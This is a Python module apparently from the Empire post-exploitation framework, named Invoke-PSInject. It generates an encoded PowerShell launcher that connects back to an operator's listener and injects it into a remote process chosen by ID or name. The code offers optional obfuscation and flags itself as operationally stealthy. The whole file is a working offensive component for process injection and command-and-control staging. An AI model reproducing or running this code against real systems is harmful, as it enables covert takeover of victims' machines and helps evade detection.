from lib.common import helpers
import base64

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-PSInject',

            'Author': ['@harmj0y', '@sixdub', 'leechristensen (@tifkin_)'],

            'Description': ("Utilizes Powershell to to inject a Stephen Fewer "
                            "formed ReflectivePick which executes PS code"
                            "from memory in a remote process"),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'http://sixdub.net'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ProcId' : {
                'Description'   :   'ProcessID to inject into.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ProcName' : {
                'Description'   :   'Process name to inject into.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        listenerName = self.options['Listener']['Value']
        procID = self.options['ProcId']['Value'].strip()
        procName = self.options['ProcName']['Value'].strip()

        if procID == '' and procName == '':
            print helpers.color("[!] Either ProcID or ProcName must be specified.")
            return ''

        # staging options
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/management/Invoke-PSInject.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
        scriptEnd = ""
        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print helpers.color("[!] Invalid listener: %s" %(listenerName))
            return ''
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)

            if launcher == '':
                print helpers.color('[!] Error in launcher generation.')
                return ''
            else:
                launcherCode = launcher.split(' ')[-1]

                if procID != '':
                    scriptEnd += "Invoke-PSInject -ProcID %s -PoshCode %s" % (procID, launcherCode)
                else:
                    scriptEnd += "Invoke-PSInject -ProcName %s -PoshCode %s" % (procName, launcherCode)
                if obfuscate:
                    scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
                script += scriptEnd
                return script
